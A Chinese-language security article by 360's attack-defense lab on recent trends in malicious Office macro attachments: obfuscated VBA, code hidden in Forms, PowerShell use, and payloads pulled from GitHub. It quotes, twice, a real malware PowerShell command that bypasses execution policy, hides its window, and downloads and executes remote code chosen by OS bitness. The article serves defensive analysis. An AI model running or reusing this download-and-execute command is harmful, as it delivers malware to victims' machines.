> 原文链接: https://www.anquanke.com//post/id/83615 


# 近期恶意office宏附件的一些变化


                                阅读量   
                                **82124**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01f9823b45816d4967.jpg)](https://p1.ssl.qhimg.com/t01f9823b45816d4967.jpg)

       ** BY:Mickey@360网络攻防实验室**

**        前言：**

        office宏系列的恶意软件在原来不靠office,adobe漏洞的时代很流行，也许是漏洞的挖掘成本上升，现在的僵尸网络病毒，比如Dridex，又开始尝试用office宏来派发邮件附件，配合利用社会工程学技术，入侵个人或企业的网络。

 

        现在的office恶意宏的趋势

 

      **  1.更加混淆**

        比如看下面的混淆过的代码

[![](https://p0.ssl.qhimg.com/t01e526323d319f504f.jpg)](https://p0.ssl.qhimg.com/t01e526323d319f504f.jpg)

        变量不规则命名，字符串拆分，穿插垃圾字符，异或编码等是常见的技术，反混淆后如下：

[![](https://p1.ssl.qhimg.com/t0143d07a3d0ca89821.jpg)](https://p1.ssl.qhimg.com/t0143d07a3d0ca89821.jpg)

        可以看到是调用MSXML2.ServerXMLHTTP来实现HTTP的GET请求的功能函数

 

        还有把代码直接存放到Forms表单的

[![](https://p4.ssl.qhimg.com/t017fbc77cb1f80dc93.jpg)](https://p4.ssl.qhimg.com/t017fbc77cb1f80dc93.jpg)

 

       ** 2.利用powershell**

        随着winxp的不再被微软支持，使用win7及以后的版本用户逐渐增多，windows系统除了继续支持vbscript,bat等脚本语言实现任务批量处理后，又增加了powershell，powershell集成.net环境，功能更为强大。恶意软件当然也会盯着这个新功能。

 

[![](https://p4.ssl.qhimg.com/t01656ee419f01ea572.jpg)](https://p4.ssl.qhimg.com/t01656ee419f01ea572.jpg)

 

        其中的powershell代码为

        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) `{`(new-object         Net.WebClient).DownloadString('https://github.com/consfw/msfw/raw/master/README') | iex `}` else `{`(new-object         Net.WebClient).DownloadString('https://github.com/consfw/msfw/raw/master/TODO') | iex`}`"

 

        这里的增加-ExecutionPolicy 是为了绕过默认powershel的安全提示，-WindowStyle Hidden 和-noprofile是为了不弹窗口。

 

      **  3.利用公共服务下载payload**

        比如上面的代码利用github来下载payload ,也会利用[IntPtr]::size 来判断操作系统版本，如下



```
if ([IntPtr]::size -eq 4) `{`
    (new-object Net.WebClient).DownloadString 
        ('https://github.com/consfw/msfw/raw/master/README') | iex
`}` else `{`
    (new-object Net.WebClient).DownloadString 
        ('https://github.com/consfw/msfw/raw/master/TODO') | iex
`}`
```

 

        如果[IntPtr]::size等于4,就是32位的操作系统，就去下载[https://github.com/consfw/msfw/raw/master/README](https://github.com/consfw/msfw/raw/master/README)，如果是8，就是64位操作系统，就去下载[https://github.com/consfw/msfw/raw/master/TODO](https://github.com/consfw/msfw/raw/master/TODO)

 

 

       ** 防护：**

        关闭office的宏功能（默认就是关闭的）。不点击来历不明的邮件附件。企业培训员工提高安全意识

 

     **   参考文章：**

[http://labs.bromium.com/2015/12/03/a-micro-view-of-macro-malware/](http://labs.bromium.com/2015/12/03/a-micro-view-of-macro-malware/)

[http://labs.bromium.com/2016/03/09/macro-malware-connecting-to-github/](http://labs.bromium.com/2016/03/09/macro-malware-connecting-to-github/)

[http://blog.trendmicro.com/trendlabs-security-intelligence/macro-malware-strides-new-direction-uses-forms-store-code/](http://blog.trendmicro.com/trendlabs-security-intelligence/macro-malware-strides-new-direction-uses-forms-store-code/)
